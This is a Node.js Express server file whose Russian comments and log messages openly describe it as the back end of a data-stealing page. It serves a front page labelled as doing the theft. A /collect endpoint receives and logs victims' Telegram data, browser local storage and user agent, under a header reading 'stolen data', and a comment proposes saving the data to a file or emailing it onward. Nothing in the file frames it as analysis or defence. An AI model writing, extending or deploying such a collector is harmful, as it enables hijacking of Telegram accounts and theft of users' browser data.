const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Главная страница с кражей данных
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// endpoint для сбора украденных данных
app.post('/collect', (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Telegram Data:', req.body.telegram_data);
    console.log('Local Storage:', req.body.local_storage); 
    console.log('User Agent:', req.body.user_agent);
    console.log('========================');
    
    // Можно добавить запись в файл или отправку на почту
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер крадёт данные на порту ${PORT}`);
});
